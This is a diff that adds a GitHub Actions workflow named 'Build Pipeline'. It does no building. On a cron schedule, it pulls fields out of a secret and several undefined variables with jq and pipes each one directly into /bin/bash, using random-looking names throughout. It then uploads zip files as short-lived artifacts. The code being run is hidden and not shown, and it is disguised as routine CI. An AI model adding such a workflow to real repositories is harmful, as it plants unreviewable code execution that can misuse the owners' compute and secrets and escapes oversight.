@@ -1,0 +1,31 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 4,10,16,22 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          yeau86260: ${{ secrets.yeau86260 }}
+        run: |
+          printf '%s' "$yeau86260" | jq -r .ey6873 | /bin/bash
+          printf '%s' "$ltoj908" | jq -r .br4 | /bin/bash
+          echo $ju7 | jq -r .cylu15581 | /bin/bash
+          echo $ovzav8 | jq -r .vhaiq446 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: kotktNvy
+          path: "*.zip"
+          retention-days: 1
